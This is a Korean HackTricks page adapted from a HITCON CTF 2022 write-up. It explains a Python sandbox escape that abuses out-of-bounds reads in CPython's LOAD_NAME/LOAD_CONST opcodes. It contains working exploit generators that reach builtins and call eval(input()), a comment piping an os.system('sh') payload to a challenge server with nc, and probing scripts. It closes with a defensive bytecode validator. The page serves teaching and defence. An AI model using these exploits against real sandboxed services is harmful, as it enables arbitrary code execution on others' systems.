# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**이 정보는** [**이 글에서 가져왔습니다**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST opcode의 OOB read 기능을 사용하여 메모리에서 일부 심볼을 가져올 수 있습니다. 이는 `(a, b, c, ... 수백 개의 심볼 ..., __getattribute__) if [] else [].__getattribute__(...)`와 같은 트릭을 사용하여 원하는 심볼(예: 함수 이름)을 가져오는 것을 의미합니다.

그런 다음 당신의 익스플로잇을 작성하세요.

### Overview <a href="#overview-1" id="overview-1"></a>

소스 코드는 매우 짧고, 단 4줄만 포함되어 있습니다!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
임의의 Python 코드를 입력할 수 있으며, 이는 [Python 코드 객체](https://docs.python.org/3/c-api/code.html)로 컴파일됩니다. 그러나 해당 코드 객체의 `co_consts`와 `co_names`는 그 코드 객체를 eval하기 전에 빈 튜플로 대체됩니다.

따라서 이 방식으로 모든 표현식이 const(예: 숫자, 문자열 등) 또는 이름(예: 변수, 함수)을 포함하면 결국 세그멘테이션 오류를 일으킬 수 있습니다.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

세그멘테이션 오류는 어떻게 발생하나요?

간단한 예로 시작해 보겠습니다. `[a, b, c]`는 다음 바이트코드로 컴파일될 수 있습니다.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
하지만 `co_names`가 빈 튜플이 된다면 어떻게 될까요? `LOAD_NAME 2` opcode는 여전히 실행되며, 원래 읽어야 할 메모리 주소에서 값을 읽으려고 시도합니다. 네, 이것은 경계 초과 읽기 "기능"입니다.

해결책의 핵심 개념은 간단합니다. CPython의 일부 opcode, 예를 들어 `LOAD_NAME`과 `LOAD_CONST`는 OOB 읽기에 취약합니다(?).

이들은 `consts` 또는 `names` 튜플에서 `oparg` 인덱스의 객체를 검색합니다(그것이 `co_consts`와 `co_names`가 내부적으로 명명된 방식입니다). CPython이 `LOAD_CONST` opcode를 처리할 때 어떤 일을 하는지 보기 위해 `LOAD_CONST`에 대한 다음의 짧은 스니펫을 참조할 수 있습니다.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
이 방법으로 우리는 OOB 기능을 사용하여 임의의 메모리 오프셋에서 "이름"을 가져올 수 있습니다. 어떤 이름이 있는지와 그 오프셋이 무엇인지 확인하려면 `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ...를 계속 시도해 보세요. oparg > 700에서 무언가를 찾을 수 있습니다. 물론 gdb를 사용하여 메모리 레이아웃을 살펴볼 수도 있지만, 그렇게 하는 것이 더 쉬울 것 같지는 않습니다.

### Exploit 생성하기 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

유용한 이름/const의 오프셋을 가져온 후, 그 오프셋에서 이름/const를 어떻게 가져와서 사용할 수 있을까요? 다음은 당신을 위한 트릭입니다:\
오프셋 5(`LOAD_NAME 5`)에서 `__getattribute__` 이름을 가져올 수 있다고 가정해 보겠습니다(`co_names=()`). 그러면 다음 작업을 수행하세요:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__`라고 이름을 붙일 필요는 없으며, 더 짧거나 이상한 이름으로 지정할 수 있습니다.

그 이유는 바이트코드를 보기만 해도 이해할 수 있습니다:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`는 `co_names`에서 이름을 검색한다는 점에 유의하세요. Python은 이름이 동일할 경우 동일한 오프셋에서 이름을 로드하므로 두 번째 `__getattribute__`도 offset=5에서 로드됩니다. 이 기능을 사용하면 이름이 메모리 근처에 있을 때 임의의 이름을 사용할 수 있습니다.

숫자를 생성하는 것은 간단해야 합니다:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

길이 제한 때문에 consts를 사용하지 않았습니다.

먼저 이름의 오프셋을 찾기 위한 스크립트입니다.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
다음은 실제 Python 익스플로잇을 생성하기 위한 것입니다.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
기본적으로 `__dir__` 메서드에서 가져온 문자열에 대해 다음과 같은 작업을 수행합니다:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### 버전 노트 및 영향을 받는 opcode (Python 3.11–3.13)

- CPython 바이트코드 opcode는 여전히 정수 피연산자로 `co_consts` 및 `co_names` 튜플에 인덱싱합니다. 공격자가 이러한 튜플을 비워두거나(또는 바이트코드에서 사용되는 최대 인덱스보다 작게) 강제로 만들 수 있다면, 인터프리터는 해당 인덱스에 대해 경계 밖 메모리를 읽게 되어 인근 메모리에서 임의의 PyObject 포인터를 반환합니다. 관련 opcode에는 최소한 다음이 포함됩니다:
- `LOAD_CONST consti` → `co_consts[consti]`를 읽습니다.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → `co_names[...]`에서 이름을 읽습니다(3.11+에서는 `LOAD_ATTR`/`LOAD_GLOBAL`이 낮은 비트에 플래그 비트를 저장하므로 실제 인덱스는 `namei >> 1`입니다). 버전별 정확한 의미는 디스어셈블러 문서를 참조하십시오. [Python dis docs].
- Python 3.11+에서는 명령어 사이에 숨겨진 `CACHE` 항목을 추가하는 적응형/인라인 캐시가 도입되었습니다. 이는 OOB 원시값을 변경하지 않으며, 바이트코드를 수동으로 작성할 경우 이러한 캐시 항목을 `co_code`를 구축할 때 고려해야 함을 의미합니다.

실용적인 의미: 이 페이지의 기술은 코드 객체를 제어할 수 있을 때(CODEType.replace(...)를 통해) CPython 3.11, 3.12 및 3.13에서 계속 작동합니다. `co_consts`/`co_names`를 축소할 수 있습니다.

### 유용한 OOB 인덱스를 위한 빠른 스캐너 (3.11+/3.12+ 호환)

고급 소스가 아닌 바이트코드에서 직접 흥미로운 객체를 탐색하는 것을 선호하는 경우, 최소한의 코드 객체를 생성하고 인덱스를 무작위로 시도할 수 있습니다. 아래 도우미는 필요할 때 자동으로 인라인 캐시를 삽입합니다.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- 이름을 조사하려면 `LOAD_CONST`를 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`로 바꾸고 스택 사용을 적절히 조정하세요.
- 필요하다면 `EXTENDED_ARG` 또는 여러 바이트의 `arg`를 사용하여 인덱스 >255에 도달하세요. 위와 같이 `dis`로 빌드할 때는 낮은 바이트만 제어할 수 있으며, 더 큰 인덱스의 경우 원시 바이트를 직접 구성하거나 여러 로드에 걸쳐 공격을 분할하세요.

### 최소 바이트코드 전용 RCE 패턴 (co_consts OOB → builtins → eval/input)

`co_consts` 인덱스가 builtins 모듈로 해결되는 것을 식별한 후, 스택을 조작하여 `eval(input())`을 `co_names` 없이 재구성할 수 있습니다:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
이 접근 방식은 `co_code`에 대한 직접적인 제어를 제공하면서 `co_consts=()` 및 `co_names=()`를 강제하는 챌린지에서 유용합니다(예: BCTF 2024 “awpcode”). 이는 소스 수준의 트릭을 피하고 바이트코드 스택 연산 및 튜플 빌더를 활용하여 페이로드 크기를 작게 유지합니다.

### 샌드박스를 위한 방어적 검사 및 완화 조치

신뢰할 수 없는 코드를 컴파일/평가하거나 코드 객체를 조작하는 Python “샌드박스”를 작성하는 경우, 바이트코드에서 사용되는 튜플 인덱스의 경계를 검사하는 데 CPython에 의존하지 마십시오. 대신, 실행하기 전에 코드 객체를 직접 검증하십시오.

실용적인 검증기 (co_consts/co_names에 대한 OOB 접근 거부)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
추가적인 완화 아이디어
- 신뢰할 수 없는 입력에 대해 임의의 `CodeType.replace(...)`를 허용하지 않거나, 결과 코드 객체에 대한 엄격한 구조 검사를 추가하십시오.
- CPython 의미에 의존하는 대신 OS 수준의 샌드박싱(예: seccomp, 작업 객체, 컨테이너)으로 신뢰할 수 없는 코드를 별도의 프로세스에서 실행하는 것을 고려하십시오.



## 참조

- Splitline의 HITCON CTF 2022 작성물 “V O I D” (이 기술의 기원 및 고수준 익스플로잇 체인): https://blog.splitline.tw/hitcon-ctf-2022/
- Python 디스어셈블러 문서 (LOAD_CONST/LOAD_NAME/etc.에 대한 인덱스 의미 및 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` 저비트 플래그): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
